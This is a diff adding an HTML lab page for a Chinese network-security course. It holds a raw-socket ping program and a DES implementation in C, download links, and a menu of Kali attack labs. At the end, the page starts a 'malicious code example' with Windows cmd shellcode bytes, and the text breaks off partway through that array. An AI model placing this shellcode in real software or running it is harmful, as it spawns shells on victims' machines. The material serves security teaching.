@@ -1,0 +1,2103 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <!-- Meta, title, CSS, favicons, etc. -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>网络信息安全实验</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="../assets/dist/css/bootstrap.css" rel="stylesheet">
+
+    <!-- Documentation extras -->
+    <link href="../docs-assets/css/docs.css" rel="stylesheet">
+    <!--<link href="../docs-assets/css/github.min.css" rel="stylesheet">-->
+    <!--<link rel="stylesheet" href="../docs-assets/css/monokai_sublime.min.css"/>-->
+    <link rel="stylesheet" href="../docs-assets/css/hljs-styles/default.css"/>
+    <style>
+        body {
+            font-family: "ff-tisa-web-pro-1", "ff-tisa-web-pro-2", "Lucida Grande", "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", "Hiragino Sans GB W3", "WenQuanYi Micro Hei", sans-serif;
+        }
+
+        h1, .h1, h2, .h2, h3, .h3, h4, .h4, .lead {
+            font-family: "ff-tisa-web-pro-1", "ff-tisa-web-pro-2", "Lucida Grande", "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", "Hiragino Sans GB W3", "Microsoft YaHei UI", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
+        }
+
+        pre code {
+            background: transparent;
+        }
+
+        p {
+            font-size: 18px;
+        }
+    </style>
+
+    <!--[if lt IE 9]>
+    <script src="../docs-assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="../assets/js/html5shiv.js"></script>
+    <script src="../assets/js/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Favicons -->
+    <link rel="shortcut icon" href="../assets/ico/favicon.png">
+
+</head>
+<body>
+<a class="sr-only" href="#content">Skip to main content</a>
+
+<!-- Docs master nav -->
+<header class="navbar navbar-inverse navbar-fixed-top bs-docs-nav" role="banner">
+    <div class="container">
+        <div class="navbar-header">
+            <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a href="#" class="navbar-brand"><span class="glyphicon glyphicon-globe"></span> 网络信息安全实验</a>
+        </div>
+        <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+            <ul class="nav navbar-nav">
+                <li>
+                    <a href="ns.html"><span class="glyphicon glyphicon-list-alt"></span> 课堂教学</a>
+                </li>
+                <li class="active">
+                    <a href="#"><span class="glyphicon glyphicon-glass"></span> 实验</a>
+                </li>
+                <li>
+                    <a href="../Moba.msi"><span class="glyphicon glyphicon-download"></span> SSH客户端MobaXterm</a>
+                </li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="#"><span class="glyphicon glyphicon-info-sign"></span> 关于</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+<!-- Docs page layout -->
+<div class="bs-header" id="content">
+    <div class="container">
+        <h1>实验教学</h1>
+
+        <p>实验共16学时，分为Windows和Kali平台两部分，可以自行或集体上机方式按要求完成。</p>
+    </div>
+</div>
+
+<!-- Callout for the old docs link -->
+
+
+<div class="container bs-docs-container">
+<div class="row">
+<div class="col-md-3">
+    <div class="bs-sidebar hidden-print" role="complementary">
+        <ul class="nav bs-sidenav">
+            <li>
+                <a href="#1">Windows平台</a>
+                <ul class="nav">
+                    <li><a href="#1-raw">Raw Socket网络编程</a></li>
+                    <li><a href="#1-des">对称加密DES</a></li>
+                    <li><a href="#1-rsa">非对称加密RSA</a></li>
+                    <li><a href="#1-hash">数字摘要/指纹-MD5、SHA</a></li>
+                    <li><a href="#1-mark">信息隐藏-数字水印</a></li>
+                    <li><a href="#1-buffer">缓存区溢出、恶意代码示例</a></li>
+                    <li><a href="#1-tools">端口扫描和字典生成工具</a></li>
+                </ul>
+            </li>
+            <li>
+                <a href="#2">Kali平台</a>
+                <ul class="nav">
+                    <li><a href="#2-vbox">虚拟机下载、安装及配置</a></li>
+                    <li><a href="#2-nginx">配置安全的nginx服务器</a></li>
+                    <li><a href="#2-info-google">信息收集-搜索引擎</a></li>
+                    <li><a href="#2-info-domain">信息收集-域名</a></li>
+                    <li><a href="#2-info-all">信息收集-全面</a></li>
+                    <li><a href="#2-scan-host">扫描-活动主机</a></li>
+                    <li><a href="#2-scan-port">扫描-活动端口</a></li>
+                    <li><a href="#2-scan-nessus">扫描-漏洞（Nessus）</a></li>
+                    <li><a href="#2-scan-openvas">扫描-漏洞（OpenVAS）</a></li>
+                    <li><a href="#3-force-hydra">暴力破解-Hydra</a></li>
+                    <li><a href="#3-force-route">暴力破解-Router</a></li>
+                    <li><a href="#3-force-wifi">暴力破解-WiFi</a></li>
+                    <li><a href="#4-exploit-macof">漏洞利用-Macof</a></li>
+                    <li><a href="#4-exploit-yersinia">漏洞利用-Yersinia</a></li>
+                    <li><a href="#4-exploit-arpspoof">漏洞利用-Arpspoof</a></li>
+                    <li><a href="#4-exploit-ettercap">漏洞利用-Ettercap</a></li>
+                    <li><a href="#4-exploit-metasploit">漏洞利用-Metasploit</a></li>
+                    <li><a href="#4-exploit-armitage">漏洞利用-Armitage</a></li>
+                    <li><a href="#5-exploit-set">社会工程学-SET</a></li>
+                    <li><a href="#6-web-w3af">Web漏洞-Nikto</a></li>
+                    <li><a href="#6-web-owasp-zap">Web漏洞-OWASP-ZAP</a></li>
+                    <li><a href="#6-web-scarab">Web漏洞-WebScarab</a></li>
+                    <li><a href="#6-web-bs">Web漏洞-Burp Suite</a></li>
+                    <li><a href="#6-web-DVWA">Web漏洞-DVWA</a></li>
+                    <li><a href="#6-web-WebGoat">Web漏洞-WebGoat</a></li>
+                    <li><a href="#7-backdoor">维持访问/留门</a></li>
+                    <li><a href="#8-report">渗透测试报告</a></li>
+
+                </ul>
+            </li>
+            <li>
+                <a href="#9">相关资料和软件</a>
+                <ul class="nav">
+                    <li><a href="#9-report">实验报告格式</a></li>
+                    <li><a href="#9-61398">Mandiant对我61398部队的报告</a></li>
+                    <li><a href="#9-kali">Kali Linux使用教程</a></li>
+                    <li><a href="#9-kali-web">用Kali进行Web渗透</a></li>
+                    <li><a href="#9-kali-video">Kali/BT渗透视频</a></li>
+                    <li><a href="#9-anyue-video">暗月渗透视频</a></li>
+                </ul>
+            </li>
+
+        </ul>
+    </div>
+</div>
+<div class="col-md-9" role="main">
+
+
+<!-- windows平台
+================================================== -->
+<div class="bs-docs-section">
+<div class="page-header">
+    <h1 id="1">Windows平台</h1>
+</div>
+<p class="lead">以下实验在Windows平台下进行，请注意各实验说明。</p>
+
+<h3 id="1-raw">Raw Socket网络编程</h3>
+
+<div class="bs-callout bs-callout-info">
+<p>Raw socket（原始套接字）可以进行IP层次的操作，常用于进行自行的IP包封装（当然伪造IP地址也就不在话下）。</p>
+
+<p>请在任何一个C语言编译环境中粘贴
+    <button class="btn btn-success" data-toggle="collapse" data-target="#1-raw-1" title="点击查看/隐藏源代码">
+        <i class="glyphicon glyphicon-edit"></i> ping网络程序源代码
+    </button>
+    ，生成exe文件后拷贝到C盘根目录运行。有兴趣的同学可进一步探究源代码。
+</p>
+<!-- 参考程序tab -->
+<div id="1-raw-1" class="collapse">
+<div class="tab-content">
+<div class="tab-pane fade in active">
+<div class="highlight">
+<pre><code class="c hljs">
+/*ping源代码，生成exe文件后在dos窗口运行即可。*/
+#pragma pack(4)
+#pragma comment(lib,"ws2_32.lib")
+#include "winsock2.h"
+#include "stdlib.h"
+#include "stdio.h"
+#define ICMP_ECHO 8
+#define ICMP_ECHOREPLY 0
+#define ICMP_MIN 8 // minimum 8 byte icmp packet (just header)
+
+/* The IP header */
+typedef struct iphdr{
+unsigned int h_len:4; // length of the header
+unsigned int version:4; // Version of IP
+unsigned char tos; // Type of service
+unsigned short total_len; // total length of the packet
+unsigned short ident; // unique identifier
+unsigned short frag_and_flags; // flags
+unsigned char ttl;
+unsigned char proto; // protocol (TCP, UDP etc)
+unsigned short checksum; // IP checksum
+unsigned int sourceIP;
+unsigned int destIP;
+}IpHeader;
+
+//
+// ICMP header
+//
+typedef struct icmphdr{
+BYTE i_type;
+BYTE i_code; /* type sub code */
+USHORT i_cksum;
+USHORT i_id;
+USHORT i_seq;
+/* This is not the std header, but we reserve space for time */
+ULONG timestamp;
+}IcmpHeader;
+
+#define STATUS_FAILED 0xFFFF
+#define DEF_PACKET_SIZE 32
+#define DEF_PACKET_NUMBER 4 /* 发送数据报的个数 */
+#define MAX_PACKET 1024
+#define xmalloc(s) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(s))
+#define xfree(p) HeapFree (GetProcessHeap(),0,(p))
+
+void Usage(char *progname);
+void fill_icmp_data(char *, int);
+USHORT checksum(USHORT *, int);
+int decode_resp(char *,int ,struct sockaddr_in *);
+
+
+int main(int argc, char **argv){
+
+WSADATA wsaData;
+SOCKET sockRaw;
+struct sockaddr_in dest,from;
+struct hostent * hp;
+int bread,datasize,times;
+int fromlen = sizeof(from);
+int timeout = 1000;
+int statistic = 0; /* 用于统计结果 */
+char *dest_ip;
+char *icmp_data;
+char *recvbuf;
+unsigned int addr=0;
+USHORT seq_no = 0;
+
+if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
+fprintf(stderr,"WSAStartup failed: %d\n",GetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+if (argc <2 ){
+Usage(argv[0]);
+}
+
+sockRaw = WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL, 0,WSA_FLAG_OVERLAPPED);
+//
+//注：为了使用发送接收超时设置(即设置SO_RCVTIMEO, SO_SNDTIMEO)，
+// 必须将标志位设为WSA_FLAG_OVERLAPPED !
+//
+if (sockRaw == INVALID_SOCKET){
+fprintf(stderr,"WSASocket() failed: %d\n",WSAGetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+bread = setsockopt(sockRaw,SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+
+if(bread == SOCKET_ERROR){
+fprintf(stderr,"failed to set recv timeout: %d\n",WSAGetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+timeout = 1000;
+bread = setsockopt(sockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));
+
+if(bread == SOCKET_ERROR){
+fprintf(stderr,"failed to set send timeout: %d\n",WSAGetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+memset(&dest,0,sizeof(dest));
+hp = gethostbyname(argv[1]);
+
+if (!hp){
+addr = inet_addr(argv[1]);
+}
+
+if ((!hp) && (addr == INADDR_NONE) ){
+fprintf(stderr,"Unable to resolve %s\n",argv[1]);
+ExitProcess(STATUS_FAILED);
+}
+
+if (hp != NULL)
+memcpy(&(dest.sin_addr),hp->h_addr,hp->h_length);
+else
+dest.sin_addr.s_addr = addr;
+
+if (hp)
+dest.sin_family = hp->h_addrtype;
+else
+dest.sin_family = AF_INET;
+dest_ip = inet_ntoa(dest.sin_addr);
+
+
+if(argc>2){
+times=atoi(argv[2]);
+if(times == 0)
+times=DEF_PACKET_NUMBER;
+}else
+times=DEF_PACKET_NUMBER;
+
+
+if(argc >3){
+datasize = atoi(argv[3]);
+if (datasize == 0)
+datasize = DEF_PACKET_SIZE;
+if (datasize >1024) /* 用户给出的数据包大小太大 */
+{
+fprintf(stderr,"WARNING : data_size is too large !\n");
+datasize = DEF_PACKET_SIZE;
+}
+}else
+datasize = DEF_PACKET_SIZE;
+
+datasize += sizeof(IcmpHeader);
+icmp_data = (char*)xmalloc(MAX_PACKET);
+recvbuf = (char*)xmalloc(MAX_PACKET);
+
+if (!icmp_data)
+{
+fprintf(stderr,"HeapAlloc failed %d\n",GetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+memset(icmp_data,0,MAX_PACKET);
+fill_icmp_data(icmp_data,datasize);
+//
+//显示提示信息
+//
+fprintf(stdout,"\nPinging %s ....\n\n",dest_ip);
+
+for(int i=0; i < times; i++)
+{
+int bwrote;
+((IcmpHeader*)icmp_data)->i_cksum = 0;
+((IcmpHeader*)icmp_data)->timestamp = GetTickCount();
+((IcmpHeader*)icmp_data)->i_seq = seq_no++;
+((IcmpHeader*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data,datasize);
+bwrote = sendto(sockRaw,icmp_data,datasize,0,(struct sockaddr*)&dest,sizeof(dest));
+
+if (bwrote == SOCKET_ERROR)
+{
+if (WSAGetLastError() == WSAETIMEDOUT) {
+printf("Request timed out.\n");
+continue;
+}
+fprintf(stderr,"sendto failed: %d\n",WSAGetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+if (bwrote < datasize ) {
+fprintf(stdout,"Wrote %d bytes\n",bwrote);
+}
+
+bread = recvfrom(sockRaw,recvbuf,MAX_PACKET,0,(struct sockaddr*)&from,&fromlen);
+if (bread == SOCKET_ERROR)
+{
+if (WSAGetLastError() == WSAETIMEDOUT)
+{
+printf("Request timed out.\n");
+continue;
+}
+fprintf(stderr,"recvfrom failed: %d\n",WSAGetLastError());
+ExitProcess(STATUS_FAILED);
+}
+
+if(!decode_resp(recvbuf,bread,&from))
+statistic++; /* 成功接收的数目++ */
+Sleep(1000);
+}
+
+/*
+Display the statistic result
+*/
+fprintf(stdout,"\nPing statistics for %s \n",dest_ip);
+fprintf(stdout,"Packets: Sent = %d,Received = %d, Lost = %d (%2.0f%% loss)\n",times,
+statistic,(times-statistic),(float)(times-statistic)/times*100);
+
+WSACleanup();
+return 0;
+
+}
+
+void Usage(char *progname)
+{
+fprintf(stderr,"Usage:\n");
+fprintf(stderr,"%s [number of packets] [data_size]\n",progname);
+fprintf(stderr,"datasize can be up to 1Kb\n");
+ExitProcess(STATUS_FAILED);
+}
+
+/*
+The response is an IP packet. We must decode the IP header to locate
+the ICMP data
+*/
+int decode_resp(char *buf, int bytes, struct sockaddr_in *from)
+{
+IpHeader *iphdr;
+IcmpHeader *icmphdr;
+unsigned short iphdrlen;
+iphdr = (IpHeader *)buf;
+iphdrlen = (iphdr->h_len) * 4 ; // number of 32-bit words *4 = bytes
+
+if (bytes < iphdrlen + ICMP_MIN)
+{
+printf("Too few bytes from %s\n",inet_ntoa(from->sin_addr));
+}
+
+icmphdr = (IcmpHeader*)(buf + iphdrlen);
+if (icmphdr->i_type != ICMP_ECHOREPLY)
+{
+fprintf(stderr,"non-echo type %d recvd\n",icmphdr->i_type);
+return 1;
+}
+
+if (icmphdr->i_id != (USHORT)GetCurrentProcessId())
+{
+fprintf(stderr,"someone else''s packet!\n");
+return 1;
+}
+printf("%d bytes from %s:",bytes, inet_ntoa(from->sin_addr));
+printf(" icmp_seq = %d. ",icmphdr->i_seq);
+printf(" time: %d ms ",GetTickCount()-icmphdr->timestamp);
+printf("\n");
+
+return 0;
+}
+
+USHORT checksum(USHORT *buffer, int size)
+{
+unsigned long cksum=0;
+while(size >1)
+{
+cksum+=*buffer++;
+size -=sizeof(USHORT);
+}
+if(size)
+{
+cksum += *(UCHAR*)buffer;
+}
+cksum = (cksum >> 16) + (cksum & 0xffff);
+cksum += (cksum >>16);
+return (USHORT)(~cksum);
+}
+
+/*
+Helper function to fill in various stuff in our ICMP request.
+*/
+void fill_icmp_data(char * icmp_data, int datasize)
+{
+IcmpHeader *icmp_hdr;
+char *datapart;
+icmp_hdr = (IcmpHeader*)icmp_data;
+icmp_hdr->i_type = ICMP_ECHO;
+icmp_hdr->i_code = 0;
+icmp_hdr->i_id = (USHORT)GetCurrentProcessId();
+icmp_hdr->i_cksum = 0;
+icmp_hdr->i_seq = 0;
+datapart = icmp_data + sizeof(IcmpHeader);
+//
+// Place some junk in the buffer.
+//
+memset(datapart,'E', datasize - sizeof(IcmpHeader));
+}
+</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<h3 id="1-des">对称加密DES</h3>
+
+<div class="bs-callout bs-callout-info">
+<p>对称加密DES（Data Encryption Standard）是最早的一种现代加密方法。</p>
+
+<p>请在任何一个C语言编译环境中粘贴
+    <button class="btn btn-success" data-toggle="collapse" data-target="#1-des-1" title="点击查看/隐藏源代码">
+        <i class="glyphicon glyphicon-edit"></i> DES程序源代码
+    </button>
+    ，直接运行即可。有兴趣的同学可进一步探究源代码。
+</p>
+<!-- 参考程序tab -->
+<div id="1-des-1" class="collapse">
+<div class="tab-content">
+<div class="tab-pane fade in active">
+<div class="highlight">
+<pre><code class="c hljs">
+    #include "memory.h"
+    #include "stdio.h"
+    enum {ENCRYPT,DECRYPT};// ENCRYPT:加密,DECRYPT:解密
+    void Des_Run(char Out[8], char In[8], bool Type=ENCRYPT);
+    // 设置密钥
+    void Des_SetKey(const char Key[8]);
+    static void F_func(bool In[32], const bool Ki[48]);// f 函数
+    static void S_func(bool Out[32], const bool In[48]);// S 盒代替
+    // 变换
+    static void Transform(bool *Out, bool *In, const char *Table, int len);
+    static void Xor(bool *InA, const bool *InB, int len);// 异或
+    static void RotateL(bool *In, int len, int loop);// 循环左移
+    // 字节组转换成位组
+    static void ByteToBit(bool *Out, const char *In, int bits);
+    // 位组转换成字节组
+    static void BitToByte(char *Out, const bool *In, int bits);
+    //置换IP表
+    const static char IP_Table[64] = {
+    58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,
+    62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,
+    57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,
+    61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7
+    };
+    //逆置换IP-1表
+    const static char IPR_Table[64] = {
+    40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,
+    38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,
+    36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,
+    34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25
+    };
+    //E位选择表
+    static const char E_Table[48] = {
+    32,1,2,3,4,5,4,5,6,7,8,9,
+    8,9,10,11,12,13,12,13,14,15,16,17,
+    16,17,18,19,20,21,20,21,22,23,24,25,
+    24,25,26,27,28,29,28,29,30,31,32,1
+    };
+    //P换位表
+    const static char P_Table[32] = {
+    16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,
+    2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25
+    };
+    //PC1选位表
+    const static char PC1_Table[56] = {
+    57,49,41,33,25,17,9,1,58,50,42,34,26,18,
+    10,2,59,51,43,35,27,19,11,3,60,52,44,36,
+    63,55,47,39,31,23,15,7,62,54,46,38,30,22,
+    14,6,61,53,45,37,29,21,13,5,28,20,12,4
+    };
+    //PC2选位表
+    const static char PC2_Table[48] = {
+    14,17,11,24,1,5,3,28,15,6,21,10,
+    23,19,12,4,26,8,16,7,27,20,13,2,
+    41,52,31,37,47,55,30,40,51,45,33,48,
+    44,49,39,56,34,53,46,42,50,36,29,32
+    };
+    //左移位数表
+    const static char LOOP_Table[16] = {
+    1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1
+    };
+    // S盒
+    const static char S_Box[8][4][16] = {
+    // S1
+    14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,
+    0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,
+    4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,
+    15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13,
+    //S2
+    15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,
+    3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,
+    0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,
+    13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9,
+    //S3
+    10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,
+    13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,
+    13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,
+    1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12,
+    //S4
+    7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,
+    13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,
+    10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,
+    3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14,
+    //S5
+    2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,
+    14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,
+    4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,
+    11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3,
+    //S6
+    12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,
+    10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,
+    9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,
+    4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,
+    //S7
+    4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,
+    13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,
+    1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,
+    6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12,
+    //S8
+    13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,
+    1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,
+    7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,
+    2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11
+    };
+    static bool SubKey[16][48];// 16圈子密钥
+    void Des_Run(char Out[8], char In[8], bool Type)
+    {
+    static bool M[64], Tmp[32], *Li = &M[0], *Ri = &M[32];
+    ByteToBit(M, In, 64);
+    Transform(M, M, IP_Table, 64);
+    if( Type == ENCRYPT ){
+    for(int i=0; i<16; i++) {
+    memcpy(Tmp, Ri, 32);
+    F_func(Ri, SubKey[i]);
+    Xor(Ri, Li, 32);
+    memcpy(Li, Tmp, 32);
+    }
+    }else{
+    for(int i=15; i>=0; i--) {
+    memcpy(Tmp, Li, 32);
+    F_func(Li, SubKey[i]);
+    Xor(Li, Ri, 32);
+    memcpy(Ri, Tmp, 32);
+    }
+    }
+    Transform(M, M, IPR_Table, 64);
+    BitToByte(Out, M, 64);
+    }
+    void Des_SetKey(const char Key[8])
+    {
+    static bool K[64], *KL = &K[0], *KR = &K[28];
+    ByteToBit(K, Key, 64);
+    Transform(K, K, PC1_Table, 56);
+    for(int i=0; i<16; i++) {
+    RotateL(KL, 28, LOOP_Table[i]);
+    RotateL(KR, 28, LOOP_Table[i]);
+    Transform(SubKey[i], K, PC2_Table, 48);
+    }
+    }
+    void F_func(bool In[32], const bool Ki[48])
+    {
+    static bool MR[48];
+    Transform(MR, In, E_Table, 48);
+    Xor(MR, Ki, 48);
+    S_func(In, MR);
+    Transform(In, In, P_Table, 32);
+    }
+    void S_func(bool Out[32], const bool In[48])
+    {
+    for(char i=0,j,k; i<8; i++,In+=6,Out+=4) {
+    j = (In[0]<<1) + In[5];
+    k = (In[1]<<3) + (In[2]<<2) + (In[3]<<1) + In[4];
+    ByteToBit(Out, &S_Box[i][j][k], 4);
+    }
+    }
+    void Transform(bool *Out, bool *In, const char *Table, int len)
+    {
+    static bool Tmp[256];
+    for(int i=0; i < len; i++)
+    Tmp[i] = In[ Table[i]-1 ];
+    memcpy(Out, Tmp, len);
+    }
+    void Xor(bool *InA, const bool *InB, int len)
+    {
+    for(int i=0; i < len; i++)
+    InA[i] ^= InB[i];
+    }
+    void RotateL(bool *In, int len, int loop)
+    {
+    static bool Tmp[256];
+    memcpy(Tmp, In, loop);
+    memcpy(In, In+loop, len-loop);
+    memcpy(In+len-loop, Tmp, loop);
+    }
+    void ByteToBit(bool *Out, const char *In, int bits)
+    {
+    for(int i=0; i < bits; i++)
+    Out[i] = (In[i/8]>>(i%8)) & 1;
+    }
+    void BitToByte(char *Out, const bool *In, int bits)
+    {
+    memset(Out, 0, (bits+7)/8);
+    for(int i=0; i < bits; i++)
+    Out[i/8] |= In[i]<<(i%8);
+    }
+    void main()
+    {
+    char key[8]={1,9,8,0,9,1,7,2},str[]="这是要加密的文字";
+    puts("Before encrypting");
+    puts(str);
+    Des_SetKey(key);
+    Des_Run(str, str, ENCRYPT);
+    puts("After encrypting");
+    puts(str);
+    puts("After decrypting");
+    Des_Run(str, str, DECRYPT);
+    puts(str);
+    }
+
+</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<h3 id="1-rsa">非对称加密RSA</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>非对称加密RSA是当前广泛使用的现代公钥加密方法。它解决了对称加密的密钥空间大、密钥传输困难等一些问题。但由于其计算量大，故多用于对小数据量如哈希值进行加密。</p>
+
+    <p>请下载 <a href="../data/ns/RSA.exe" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> RSA程序
+    </a> 进行测试，了解其过程。有兴趣的同学可进一步探究其 <a href="../data/ns/DES.rar" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> 源代码
+    </a>。（请在vc6中打开工程文件，高版本中需要进行转换）</p>
+
+    <p>另给大家附上NB的开源加密软件 <a href="../data/ns/truecrypt-7.1a(FBI都无法的加密).exe" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> TrueCrypt
+    </a> <a href="../data/ns/truecrypt-7.1a-langpack-zh-cn-0.1.0.zip" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> 汉化包（内有方法）
+    </a> 及某博客上的 <a href="../data/ns/TrueCrypt全球最好的加密软件%20附简明教程%20—%20YESURE技术博客.rar" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> 使用教程
+    </a></p>
+
+</div>
+
+<h3 id="1-hash">数字摘要/指纹-MD5、SHA</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>数字摘要/指纹是指信息的唯一固定长度值，主要有MD5和SHA两种，多用于不需要保密但要求完整性的情形。</p>
+
+    <p>请下载 <a href="../data/ns/HashCalc.exe" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> Hash计算程序
+    </a> 进行测试，了解其过程（改变任意一位则其摘要将发生变化）。有兴趣的同学可进一步探究MD5的源码
+        <a href="../data/ns/md5.rar" class="btn btn-success">
+            <i class="glyphicon glyphicon-save"></i> MD5C++源代码
+        </a>。</p>
+
+    <p>另外，网站XMD5还可对一些简单的MD5值进行验证，可自行 <a href="http://www.xmd5.org/" class="btn btn-info">
+        <i class="glyphicon glyphicon-globe"></i> 前往
+    </a> ，相信会有收获！</p>
+
+</div>
+
+<h3 id="1-mark">信息隐藏-数字水印</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>信息隐藏是指利用图片、音频、视频等作为载体保存额外的信息，同时其画质、音质等几乎不发生改变的技术。目前多用于数字作品的版权等方面，故也称为数字水印。</p>
+
+    <p>请下载 <a href="../data/ns/数字水印.rar" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> 信息隐藏程序
+    </a> 进行测试，了解其过程及原理。
+    </p>
+    <h4>使用过程如下：</h4>
+
+    <p>
+        隐藏信息：
+        运行S-Tools后，拖入原始图片（BMP格式）或音频文件，再拖入要隐藏的文件到图片上，弹出对话框要求输入提取的口令及加密方式，然后点击右键将该文件另存为即可；
+        <br>提取信息：
+        运行S-Tools后，拖入隐藏有信息的图片或音频文件，点击右键点击提取即可（当然需要口令）。
+        <br>
+        提取斑马图片中的文本口令为abc。
+    </p>
+    <p>另一个密写技术软件 <a href="../data/ns/steghide.zip" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> StegHide程序
+    </a> ，支持BMP、JPEG、WAV等格式，可前往其官网了解原理。
+    </p>
+</div>
+
+<h3 id="1-buffer">缓存区溢出、恶意代码示例</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>请阅读以下代码，生成对应文件进行测试</p>
+
+    <p>
+        <button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#1-buffer-1"
+                title="点击查看/隐藏参考程序"><i class="glyphicon glyphicon-edit"></i> 查看程序
+        </button>
+    </p>
+    <!-- 参考程序tab -->
+    <div id="1-buffer-1" class="collapse">
+        <ul class="nav nav-tabs">
+            <li class="active"><a href="#1-buffer-1-1" data-toggle="tab">缓存区溢出</a></li>
+            <li><a href="#1-buffer-1-2" data-toggle="tab">脚本恶意程序一</a></li>
+            <li><a href="#1-buffer-1-3" data-toggle="tab">脚本恶意程序二</a></li>
+
+        </ul>
+        <div class="tab-content">
+            <div class="tab-pane fade in active" id="1-buffer-1-1">
+                <div class="highlight">
+<pre><code class="c hljs">
+    /*C语言程序。*/
+    #include "stdio.h"
+    void malice(){
+    printf("Hey, 你已经被攻击了！\n");
+    //模拟的恶意程序malice
+    unsigned char shellcode[] = {
+    // Windows 2000, Windows 2003, Windows XP
+    // Windows Vista, Windows 7通用cmd Shellcode
+    "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
+    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
+    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
+    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
+    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
+    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
+    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
+    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
+    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
+    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
